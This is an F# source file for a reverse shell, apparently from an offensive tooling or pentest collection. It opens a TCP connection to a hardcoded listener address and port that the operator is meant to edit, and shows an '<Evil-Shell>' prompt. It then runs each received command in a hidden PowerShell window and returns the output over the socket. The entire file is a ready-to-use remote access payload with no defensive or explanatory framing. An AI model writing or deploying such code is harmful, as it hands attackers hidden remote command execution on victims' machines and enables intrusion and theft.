open System
open System.Diagnostics
open System.Net.Sockets

let asciiEncode (s: string): byte [] =
    Text.Encoding.ASCII.GetBytes(s)

let sendBytes (str: NetworkStream) (msg: string): unit =
    str.Write(asciiEncode msg, 0, msg.Length)

let runCommand (cmd: string): string * string  =
    let p = new Process()
    p.StartInfo.WindowStyle <- ProcessWindowStyle.Hidden
    p.StartInfo.CreateNoWindow <- true
    p.StartInfo.FileName <- "powershell"
    p.StartInfo.Arguments <- $"-c %s{cmd}"
    p.StartInfo.RedirectStandardOutput <- true
    p.StartInfo.RedirectStandardError <- true
    p.StartInfo.UseShellExecute <- false
    p.StartInfo.CreateNoWindow <- true
    p.Start() |> ignore
    let stdout = p.StandardOutput.ReadToEnd()
    let stderr = p.StandardError.ReadToEnd()
    (stdout, stderr)

let lhost = "192.168.49.130" // Change This 
let lport = 1234             // Change This
let client = new TcpClient(lhost, lport)

exception BreakException

try
    while true do

        let stream = client.GetStream()
        
        let prompt = "<Evil-Shell> "
        sendBytes stream prompt

        let recvBuf = Array.zeroCreate<byte> 1024
        let recvData = stream.Read(recvBuf,0, recvBuf.Length)
        
        let cmd = Text.Encoding.ASCII.GetString(recvBuf)

        match cmd with
        | "exit\n" | "quit\n" -> stream.Close()
                                 client.Close()
                                 raise BreakException
                            
        | _                   -> let (stdout, stderr) = runCommand cmd
                                 sendBytes stream stdout
                                 sendBytes stream stderr
        
with BreakException -> ()
